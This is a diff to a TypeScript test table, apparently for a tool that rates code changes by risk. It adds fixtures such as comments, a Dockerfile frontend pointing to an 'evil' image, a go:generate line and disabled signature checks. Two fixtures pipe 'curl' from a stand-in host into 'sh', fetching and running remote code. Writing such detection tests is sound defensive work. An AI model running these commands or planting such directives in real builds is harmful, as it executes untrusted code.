@@ -156,6 +156,11 @@ const LOW: Array<[string, RiskFile[]]> = [
 +  assert.equal(await hasPermission(user, "read"), true);
 +  assert.equal(await app.inject("/v1/probe").status, 200);
  });`), mod("src/__tests__/auth.test.ts", "@@ -1,2 +1,3 @@\n a\n+jwt.verify(token, key)")]],
+  ["a prose comment that begins with `if` in a release script", [mod("scripts/install.sh", `@@ -4,3 +4,3 @@
+-# if the directory exists we reuse it
++# if the directory exists we keep it and skip the clone
+ mkdir -p "$DIR"`)]],
+  ["a plain comment in a Dockerfile and in a migration", [mod("Dockerfile", "@@ -1,2 +1,2 @@\n-# base image\n+# base image, pinned\n FROM node:26-slim"), mod("db/migrations/0001_init.sql", "@@ -1,2 +1,2 @@\n--- creates the first table\n+-- creates the first table of the schema\n a")]],
   ["a small bug fix: one condition", [mod("src/queue/drain.ts", `@@ -31,7 +31,7 @@ async function drain(q: Queue): Promise<void> {
 -  while (q.length > 1) {
 +  while (q.length > 0) {
@@ -501,6 +506,38 @@ const HIGH: Row[] = [
   ] },
   { name: "a Makefile target", category: "ci_release", why: /release or deployment file changed: Makefile/, files: [
     mod("Makefile", "@@ -10,2 +10,3 @@\n release:\n+\tcurl -s https://example.invalid/x.sh | sh\n \tnpm publish"),
+  ] },
+
+  // ---- comments a tool reads are not comments
+  { name: "a Dockerfile parser directive names another BuildKit frontend", category: "ci_release", why: /release or deployment file changed: Dockerfile/, files: [
+    mod("Dockerfile", `@@ -1,3 +1,3 @@
+-# syntax=docker/dockerfile:1
++# syntax=registry.example.invalid/frontends/evil:latest
+ FROM node:26-slim`),
+  ] },
+  { name: "a migration tool directive", category: "interface", why: /database migration changed \(db\/migrations\/0007_backfill\.sql\)/, files: [
+    mod("db/migrations/0007_backfill.sql", `@@ -1,3 +1,4 @@
++-- +goose NO TRANSACTION
+ -- +goose Up
+ UPDATE orders SET region = 'eu' WHERE region IS NULL;`),
+  ] },
+  { name: "a go:generate directive runs a command", category: "security", why: /code execution or injection surface changed \(tools\/gen\.go\)/, files: [
+    mod("tools/gen.go", `@@ -1,3 +1,4 @@
+ package tools
++//go:generate sh -c "curl -s https://example.invalid/x | sh"
+ import "fmt"`),
+  ] },
+  { name: "a security scanner is switched off for a line", category: "security", why: /a security check suppressed changed \(pkg\/run\/exec\.go\)/, files: [
+    mod("pkg/run/exec.go", `@@ -20,3 +20,3 @@ func Run(cmd string) error {
+-	return exec.Command("sh", "-c", cmd).Run()
++	return exec.Command("sh", "-c", cmd).Run() // #nosec G204
+ }`),
+  ] },
+  { name: "a preprocessor line in an authentication module written in C", category: "security", why: /authentication or security code changed: src\/auth\/check\.c/, files: [
+    mod("src/auth/check.c", `@@ -1,4 +1,4 @@
+-#define VERIFY_SIGNATURES 1
++#define VERIFY_SIGNATURES 0
+ int check(void);`),
   ] },
 
   // ---- dependencies, which are an edge of the dependency graph
